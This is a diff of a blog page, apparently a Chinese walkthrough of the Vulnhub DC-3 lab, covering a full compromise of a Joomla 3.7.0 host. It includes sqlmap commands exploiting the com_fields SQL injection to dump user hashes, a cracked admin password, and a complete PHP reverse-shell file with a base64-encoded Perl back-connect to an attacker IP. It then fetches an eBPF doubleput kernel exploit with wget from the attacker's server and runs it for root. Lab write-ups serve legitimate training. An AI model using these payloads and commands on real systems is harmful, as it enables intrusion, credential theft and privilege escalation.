@@ -85,7 +85,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">357</span>
+            <span class="post-count">1.6k</span>
         </span>
     </span>
 
@@ -94,7 +94,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">7 分钟</span>
         </span>
     </span>
 </div>
@@ -117,31 +117,168 @@
 <blockquote>
 <p>这个靶场与之前的不同，只有一个入口点和一个flag，并且没有任何线索。<br>靶场只需要简单的下载，解压，打开并将其导入到VMware即可</p>
 </blockquote>
-<h4 id="1-寻找目标"><a href="#1-寻找目标" class="headerlink" title="1.寻找目标"></a>1.寻找目标</h4><p>扫描同一网段中的IP</p>
+<span id="more"></span>
+
+<h4 id="1-主机扫描"><a href="#1-主机扫描" class="headerlink" title="1.主机扫描"></a>1.主机扫描</h4><p>扫描同一网段中的IP</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230612093741121.png" alt="image-20230612093741121"></p>
 <p>发现目标IP</p>
-<p>扫描靶机目标，查看目标开放的服务端口</p>
+<h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><p>扫描靶机目标，查看目标开放的服务端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -p 1-65535 192.168.1.43</span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613084619194.png" alt="image-20230613084619194"></p>
 <p>通过扫描，发现了一些关键信息</p>
-<h4 id="2-收集网站信息"><a href="#2-收集网站信息" class="headerlink" title="2.收集网站信息"></a>2.收集网站信息</h4><p>在浏览器中输入地址查看，发现是Joomla</p>
+<h4 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h4><p>在浏览器中输入地址查看，发现是Joomla</p>
 <blockquote>
 <p>Joomla 在海外使用较多，是一套使用 PHP 和 MySQL 开发的开源、跨平台的内容管理系统(CMS)。</p>
 </blockquote>
 <p>在页面中发现是一个登录页面，没有其他敏感信息，使用dirsearch扫描目录</p>
 <p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613090659008.png" alt="image-20230613090659008"></p>
-<p>在<code>/administrator/index.php</code> 目录下发现后台登录页面</p>
+<h4 id="4-web页面探测"><a href="#4-web页面探测" class="headerlink" title="4.web页面探测"></a>4.web页面探测</h4><p>在<code>/administrator/index.php</code> 目录下发现后台登录页面</p>
 <p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230613092301105.png" alt="image-20230613092301105"></p>
-<h4 id="3-寻找漏洞"><a href="#3-寻找漏洞" class="headerlink" title="3.寻找漏洞"></a>3.寻找漏洞</h4><p>因为是常见的cms,所以我们直接扫Joomla! cms常见漏洞</p>
-<blockquote>
-<p>1.安装onlinetool(在线cms识别|信息泄露|工控|系统|物联网安全|cms漏洞扫描|nmap端口扫描|子域名获取 在线工具安装)</p>
-<p>地址 <a target="_blank" rel="noopener" href="https://github.com/iceyhexman/onlinetools">https://github.com/iceyhexman/onlinetools</a></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iceyhexman/onlinetools.git</span><br><span class="line">cd onlinetools</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">nohup python3 main.py &amp;</span><br></pre></td></tr></table></figure>
+<p>打开网站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.43</span><br></pre></td></tr></table></figure>
 
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615141343222.png" alt="image-20230615141343222"></p>
+<h3 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h3><h4 id="1-寻找漏洞"><a href="#1-寻找漏洞" class="headerlink" title="1.寻找漏洞"></a>1.寻找漏洞</h4><blockquote>
+<p>根据提示只有一个flag，并且需要拿到root权限才能得到。并且可以知道网站的CMS系统是Joomla。<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a>自带Joomla的扫描命令即Joomscan.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u 192.168.1.43</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615141551861.png" alt="image-20230615141551861"></p>
+<p>发现了cms的版本，版本号：Joomla 3.7.0，还扫出一堆网站目录和后台登录页面</p>
+<p>直接在漏洞库搜索是否有可利用的漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615144218348.png" alt="image-20230615144218348"></p>
+<h4 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h4><p>发现当前cms存在SQL注入漏洞，还有跨站扫描漏洞，我们看一下SQL注入，该漏洞文件地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
+
+<p>查看一下其文件内容</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615144649354.png" alt="image-20230615144649354"></p>
+<p>会发现文件内容已经给出了注入点和SQL注入命令</p>
+<p>列出数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p>看了别的博主,他们是这个样子的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615145724417.png" alt="image-20230615145724417"></p>
+<p>接下来列出指定数据库的所有表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch -D &#x27;joomladb&#x27; --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615150052275.png" alt="image-20230615150052275"></p>
+<p>倒数第三个，知道表名</p>
+<p>我们列出所有列名</p>
+<blockquote>
+<p>由于表名含有特殊符号，需要引号包括</p>
+<p>–batch：作用是选项全选yes</p>
+<p>这里就不可以使用–batch参数了，会默认使用公共参数爆破给no掉，导致注入失败，根据提示，手工输入y并回车</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] -D &#x27;joomladb&#x27; -T &#x27;#__users&#x27; --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615152932157.png" alt="image-20230615152932157"></p>
+<p>查看用户名密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.43/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] -D &#x27;joomladb&#x27; -T &#x27;#__users&#x27; -C name,id,password,username --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615153124097.png" alt="image-20230615153124097"></p>
+<p>拿到用户名和密码</p>
+<blockquote>
+<p>username：admin</p>
+<p>password：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</p>
+</blockquote>
+<h4 id="3-爆破密码"><a href="#3-爆破密码" class="headerlink" title="3.爆破密码"></a>3.爆破密码</h4><p>发现密码是经过加密的</p>
+<p>没有加密函数只能爆破密码了</p>
+<p>利用 <code>john</code> 工具，对密码进行爆破拆解</p>
+<p>现在桌面创建一个文件，将上面的hash密码复制进去并保存，接着使用john工具指向该文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show 文件名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615154158309.png" alt="image-20230615154158309"></p>
+<blockquote>
+<p>username：admin</p>
+<p>password：snoopy</p>
+</blockquote>
+<p>得到密码尝试后台登录</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615154438614.png" alt="image-20230615154438614"></p>
+<p>进入后台，发现</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615154554254.png" alt="image-20230615154554254"></p>
+<h4 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h4><p>探测后台管理员系统了，发现了文件上传的点位，在Beez3这里</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615154905074.png" alt="image-20230615154905074"></p>
+<p>貌似有文件上传过滤，但是我们可以自己创建一个文件，写入木马，也可以直接反弹shell</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615155210097.png" alt="image-20230615155210097"></p>
+<p>将PHP反弹shell代码复制进去</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot;192.168.1.49&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&#x27;6666&#x27;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615160725110.png" alt="image-20230615160725110"></p>
+<p>写好后，保存上传就好了，根据joomla的特性，模块会单独放在一个文件夹里&#x2F;templates&#x2F;，而beez3模块就在&#x2F;templates&#x2F;beez3&#x2F;里面</p>
+<p>在浏览器地址栏中输入如下代码，执行a.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.43/templates/beez3/a.php</span><br></pre></td></tr></table></figure>
+
+<p>a.php执行后，即可成功连接</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615163251855.png" alt="image-20230615163251855"></p>
+<p>连接后利用python获取交互shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615161007126.png" alt="image-20230615161007126"></p>
+<h3 id="四、Linux提权"><a href="#四、Linux提权" class="headerlink" title="四、Linux提权"></a>四、Linux提权</h3><h4 id="1-确定操作系统信息"><a href="#1-确定操作系统信息" class="headerlink" title="1.确定操作系统信息"></a>1.确定操作系统信息</h4><p>这不能用suid和git提权，得换种方法，先查看操作系统版本，以寻找提权漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac /etc/issue</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615163634637.png" alt="image-20230615163634637"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615163737693.png" alt="image-20230615163737693"></p>
+<p>得到操作系统与其版本</p>
+<h4 id="2-搜索操作系统漏洞"><a href="#2-搜索操作系统漏洞" class="headerlink" title="2.搜索操作系统漏洞"></a>2.搜索操作系统漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615164103943.png" alt="image-20230615164103943"></p>
+<p>利用通用版本4.4.x版本提权方式，完整path</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615164435252.png" alt="image-20230615164435252"></p>
+<p>文本写的是漏洞产生的原因，描述和漏洞利用的方法，还附上了exp，就是最后一行的连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-利用exp提权"><a href="#3-利用exp提权" class="headerlink" title="3.利用exp提权"></a>3.利用exp提权</h4><p>将下载的压缩包放到一个文件夹里，解压得到一个39772的文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip 39772.zip</span><br></pre></td></tr></table></figure>
+
+<p>进入解压出来的39772文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd 39772</span><br></pre></td></tr></table></figure>
+
+<p>kali上开启http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5666</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615165350348.png" alt="image-20230615165350348"></p>
+<p>在dc3靶机中接收39772文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 192.168.1.49:5666/exploit.tar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170104052.png" alt="image-20230615170104052"></p>
+<p>下载完后用tar命令解压该压缩包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170239773.png" alt="image-20230615170239773"></p>
+<p>cd进入解压后的文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ebpf_mapfd_doubleput_exploit/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170416760.png" alt="image-20230615170416760"></p>
+<p>执行下两个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170551239.png" alt="image-20230615170551239"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./doubleput</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170707614.png" alt="image-20230615170707614"></p>
+<p>执行完后查看当前用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615170815020.png" alt="image-20230615170815020"></p>
+<p>提权成功</p>
+<p>4.查找flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615171118479.png" alt="image-20230615171118479"></p>
+<p>直接查看flag</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC3%E9%9D%B6%E5%9C%BA/image-20230615171213766.png" alt="image-20230615171213766"></p>
  
       <!-- reward -->
       
